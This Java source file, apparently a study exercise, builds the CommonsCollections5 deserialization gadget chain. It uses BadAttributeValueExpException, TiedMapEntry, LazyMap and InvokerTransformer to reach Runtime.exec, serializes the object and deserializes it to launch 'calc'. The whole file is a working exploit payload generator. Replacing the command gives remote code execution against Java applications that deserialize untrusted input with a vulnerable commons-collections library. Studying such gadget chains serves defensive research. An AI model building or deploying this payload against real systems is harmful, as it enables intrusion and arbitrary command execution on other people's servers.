package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/*
* BadAttributeValueExpException.readObject()
*  ->TiedMapEntry.toString()
*   ->TiedMapEntry.getValue()
*    ->LazyMap.get()
*     ->ChainedTransformer.transform()
*      ->InvokerTransformer.transform()
* */

public class CC5 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc"})
        };
        // 第二层
        Map<Object, Object> hashMap = new HashMap<>();
        Map innerMap = LazyMap.decorate(hashMap,transformerChain);
        TiedMapEntry mapEntry = new TiedMapEntry(innerMap,"3xsh0re");
        BadAttributeValueExpException attributeValue = new BadAttributeValueExpException(null);

        setFieldValue(transformerChain,"iTransformers",transformers);
        setFieldValue(attributeValue,"val",mapEntry);
        hashMap.remove("3xsh0re");

        // 测试
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(attributeValue);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }
}
